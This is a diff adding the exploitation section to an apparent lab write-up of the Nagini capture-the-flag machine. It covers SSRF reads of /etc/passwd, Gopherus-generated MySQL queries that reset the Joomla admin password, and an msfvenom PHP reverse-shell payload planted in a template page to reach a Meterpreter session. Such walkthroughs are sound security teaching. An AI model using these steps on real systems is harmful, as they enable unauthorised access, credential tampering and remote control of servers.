@@ -324,11 +324,137 @@ In addition, an administrator login page was found, with ***JoomScan*** tool, at
 
 # 6. Target Exploitation
 
+The goal of this phase is to exploit the vulnerabilities discovered during the previous Vulnerability Mapping phase in order to gain access to the target machine, derive sensitive information, and/or gain full control of the target machine.
+
 ## Database Exploitation
+
+From the Vulnerability Mapping phase, we discovered that the Nagini target machine is affected by a **Server-Side Request Forgery** (**SSRF**) vulnerability because through the **/internalResourceFeTcher.php** page it's possible to cause the web server to make HTTP requests to arbitrary domains. Let's try to exploit this  vulnerability.
+
+If we enter a string like ```file://path_to_file``` inside the form, the web server should show us the contents of the file on the screen. For example, if we enter ```file:///etc/passwd``` this is what we get:
+
+<p align="center">
+    <img src="./images/target_exploitation/passwd.png" width="720">
+</p>
+
+We get information about all user accounts found within the server. Unfortunately, if we enter ```file:///etc/shadow``` in the form we get nothing back, probably the account associated with the web server doesn't have read permissions.
 
 ### Remote Code Execution - Gopherus
 
+Since we know that there is **Server-Side Request Forgery** (**SSRF**), we can use the Gopherus tool, which can be downloaded from the following repository <https://github.com/tarunkant/Gopherus>. This tool can generate a payload to exploit an SSRF vulnerability so that **Remote Code Execution** (**RCE**) can be performed. In the case of a MySQL database, the tool works only if the user who has access to the database is not protected by any password, but this is exactly our case. To run it we type the command:
+
+    gopherus -exploit mysql
+
+At this point we need to provide the username of the user who has access to the database and the SQL code we want to run. In output we will be returned the payload.
+
+Since we know that there is a database called "joomla", let's try to generate the payload for executing the query:
+
+```sql
+USE joomla; SHOW tables;
+```
+
+<p align="center">
+    <img src="./images/target_exploitation/payload1.png" width="720">
+</p>
+
+Next, we insert the generated payload into the form of the /internalResourceFeTcher.php page, to force the query execution and get the database tables:
+
+<p align="center">
+    <img src="./images/target_exploitation/output_payload1.png" width="720">
+</p>
+
+We find that a joomla_user table exists. At this point we re-run the gopherus tool and generate the payload for executing the query:
+
+```sql
+USE joomla; SELECT * FROM joomla_users;
+```
+
+In this way we obtain the joomla_users table content.
+
+<p align="center">
+    <img src="./images/target_exploitation/payload2.png" width="720">
+</p>
+
+Again, we insert the generated payload into the 'form':
+
+<p align="center">
+    <img src="./images/target_exploitation/output_payload2.png" width="720">
+</p>
+
+We find that each user has e-mail address as a key attribute and a password attribute. In addition, we find that the admin's e-mail is ```site_admin@nagini.hogwarts```. At this point, we re-run the gopherus tool and generate the payload for executing the query:
+
+```sql
+USE joomla; UPDATE joomla_users
+SET password='21232f297a57a5a743894a0e4a801fc3'  
+WHERE email='site_admin@nagini.hogwarts';
+```
+
+in order to change the administrator's password. In the previous command, the string "21232f297a57a5a743894a0e4a801fc3" is the MD5 of the string "admin". MD5 was used because it's supported by MySQL in Joomla.
+
+<p align="center">
+    <img src="./images/target_exploitation/payload3.png" width="720">
+</p>
+
+Again, we insert the generated payload into the 'form':
+
+<p align="center">
+    <img src="./images/target_exploitation/output_payload3.png" width="720">
+</p>
+
+We were able to change the administrator's password.
+
+> **Remarks**: after inserting the payload into the form, you need to refresh the web page several times, otherwise nothing will be displayed.
+
+Since we have changed the administrator's password, we go to the administrator login page and try to authenticate with the new credentials:
+
+- **username**: site_admin
+- **passowrd**: admin
+
+<p align="center">
+    <img src="./images/target_exploitation/home_admin.png" width="720">
+</p>
+
+We were able to authenticate as  administrator.
+
 ## Client Side Exploitation
+
+Since we are authenticated as an administrator, we can create new web pages and edit existing ones. Therefore, we can hide a **reverse shell** payload into a web page. In this way, whenever it will be requested, the web server will establish a connection with attacking machine, which will be listening on a certain port.
+
+The tool **msfvenom** can be used to generate a **reverse shell php** payload. For this purpose, we execute the following command:
+
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f raw
+
+- ```LHOST``` : is the IP address of the host to establish the connection with, i.e. attacking machine IP address;
+- ```LPORT``` : is the port on which to establish the connection, i.e. the port on which the attacking machine will be listening.
+
+<p align="center">
+    <img src="./images/target_exploitation/reverse_shell_php.png" width="720">
+</p>
+
+At this point we select, from the administrator's homepage, the ```Templates``` menu, then select the ```protostar``` template and edit the ```error.php``` error page by inserting the payload generated earlier:
+
+<p align="center">
+    <img src="./images/target_exploitation/error.png" width="720">
+</p>
+
+Next, we start the metasploit console on the attacking machine:
+
+<p align="center">
+    <img src="./images/target_exploitation/metaesploit.png" width="720">
+</p>
+
+Let's configure it to listen on port 4444 while waiting for the connection from the target machine to establish the reverse shell.
+
+<p align="center">
+    <img src="./images/target_exploitation/metaesploit_configuration.png" width="720">
+</p>
+
+Through the browser we make a malformed request to retrieve the error page. For example, we can visit the url ```http://10.0.2.4/joomla/index.php/<>```.
+
+<p align="center">
+    <img src="./images/target_exploitation/meterpreter.png" width="720">
+</p>
+
+We were able to obtain a meterpreter shell on the target machine.
 
 # 7. Post-Exploitation
 
